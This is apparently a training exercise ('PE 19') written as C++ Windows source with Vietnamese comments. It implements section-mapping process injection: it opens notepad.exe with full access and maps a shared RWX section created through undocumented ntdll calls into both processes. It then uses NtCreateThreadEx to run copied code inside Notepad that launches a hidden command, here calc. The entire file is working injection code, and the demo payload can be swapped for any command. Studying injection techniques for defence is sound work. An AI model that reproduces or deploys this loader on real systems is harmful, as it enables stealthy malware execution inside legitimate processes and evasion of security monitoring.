#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Khai báo nguyên mẫu các Native API dạng con trỏ hàm phẳng, dùng PVOID để né lỗi định nghĩa thư viện ngoài
typedef NTSTATUS(NTAPI* pNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
    );

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN DWORD InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
    );

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm phản chiếu sang Notepad
DWORD WINAPI RemoteMirrorPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Gọi bằng con trỏ hàm tuyệt đối, né sạch lỗi địa chỉ tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 19: NtCreateSection MapViewOfSection " << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc nhen." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    // 2. Resolve các hàm Native từ ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return EXIT_FAILURE;

    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    // 3. Mở Handle quyền cao kết nối sang Notepad
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess that bai!" << std::endl;
        return EXIT_FAILURE;
    }

    // Kích thước ước tính kịch khung cho phân vùng mã máy và cấu trúc dữ liệu
    SIZE_T totalPayloadSize = 4096;

    // ─── BƯỚC 4: KHỞI TẠO SECTION THÔ TRONG LÒNG KERNEL DƯỚI QUYỀN RWX ───
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionMaxSize = { 0 };
    sectionMaxSize.QuadPart = totalPayloadSize;

    // Tạo Section tổng thể mang quyền bảo vệ thực thi, đọc, ghi cao nhất
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!hSection) {
        std::cerr << "[-] NtCreateSection that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 5: ÁNH XẠ VIEW THỨ NHẤT VÀO LÒNG LOADER CỦA TA (QUYỀN RW) ───
    PVOID localViewAddress = NULL;
    SIZE_T localViewSize = totalPayloadSize;
    NtMapViewOfSection(hSection, GetCurrentProcess(), &localViewAddress, 0, 0, NULL, &localViewSize, 1, 0, PAGE_READWRITE);
    std::cout << "[+] Da thiet lap View guong noi bo tai Loader: 0x" << std::hex << localViewAddress << std::endl;

    // Tiến hành ghi nội dung logic hàm và dữ liệu cục bộ lên View 1
    // Đoạn mã máy Payload được đặt ở đầu vùng nhớ gương
    PVOID localCodeAddr = localViewAddress;
    memcpy(localCodeAddr, (PVOID)RemoteMirrorPayload, 500);

    // Cấu trúc dữ liệu tham số tuyệt đối đặt lùi lại phía sau ô nhớ offset 500 byte
    PTHREAD_DATA pLocalDataAddr = (PTHREAD_DATA)((DWORD_PTR)localViewAddress + 500);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pLocalDataAddr->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(pLocalDataAddr->szCommand, "cmd.exe /c start calc");
    std::cout << "[+] Ghi du lieu tham so vao guong noi bo hoan tat." << std::endl;

    // ─── BƯỚC 6: ÁNH XẠ VIEW THỨ HAI SANG KHÔNG GIAN RAM TIẾN TRÌNH NOTEPAD ───
    // Dữ liệu từ View 1 tự động phản chiếu nhảy sang View 2 mà không cần WriteProcessMemory!
    PVOID remoteViewAddress = NULL;
    SIZE_T remoteViewSize = totalPayloadSize;
    NtMapViewOfSection(hSection, hProcess, &remoteViewAddress, 0, 0, NULL, &remoteViewSize, 1, 0, PAGE_EXECUTE_READWRITE);
    std::cout << "[+] PHAN CHIEU THANH CONG: Toa do View tu xa inside Notepad: 0x" << std::hex << remoteViewAddress << std::endl;

    // Tính toán tọa độ thực thi chức năng và dữ liệu tham số tương ứng bên phía RAM tiến trình Notepad
    PVOID remoteCodeBuffer = remoteViewAddress;
    PVOID pRemoteDataBuffer = (PVOID)((DWORD_PTR)remoteViewAddress + 500);

    // ─── BƯỚC 7: KÍCH NỔ LUỒNG CPU NATIVE TỪ XA QUA Ô NHỚ PHẢN CHIẾU ───
    std::cout << "[*] Dang dung NtCreateThreadEx de sinh luong va khai hoa..." << std::endl;
    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, pRemoteDataBuffer, 0, 0, 0, 0, NULL);

    if (hThread != NULL) {
        // Ép luồng gánh trạng thái an toàn
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] Section Mapping executed successfully inside Target!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] NtCreateThreadEx that bai! Error code: " << GetLastError() << std::endl;
    }

    // ─── BƯỚC 8: GIẢI PHÓNG DIỆN MẠO GƯƠNG VÀ ĐÓNG HANDLE CHỐNG RÒ RỈ ───
    UnmapViewOfFile(localViewAddress);
    CloseHandle(hSection);
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}